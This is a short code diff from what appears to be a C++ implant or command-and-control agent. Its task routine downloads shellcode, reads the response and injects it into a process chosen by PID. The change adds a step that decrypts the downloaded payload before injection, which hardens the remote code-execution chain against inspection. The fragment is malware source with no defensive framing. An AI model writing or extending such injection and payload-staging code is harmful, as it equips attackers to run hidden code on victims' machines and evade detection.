@@ -26,14 +26,17 @@ namespace Task
 			return L"Error: Failed to download shellcode.";
 		}
 
+        // Read enc data
         std::vector<BYTE> respBytes = System::Http::ReadResponseBytes(pState->pProcs, resp.hRequest);
         if (respBytes.size() == 0)
         {
             return L"Error: Failed to read response data.";
         }
+        // Decrypt the data
+        std::vector<BYTE> bytes = Crypt::DecryptData(Utils::Convert::VecByteToString(respBytes));
 
         // Inject shellcode
-        if (!Technique::Injection::ShellcodeInjection(dwPid, respBytes))
+        if (!Technique::Injection::ShellcodeInjection(dwPid, bytes))
         {
             return L"Error: Failed to inject shellcode.";
         }
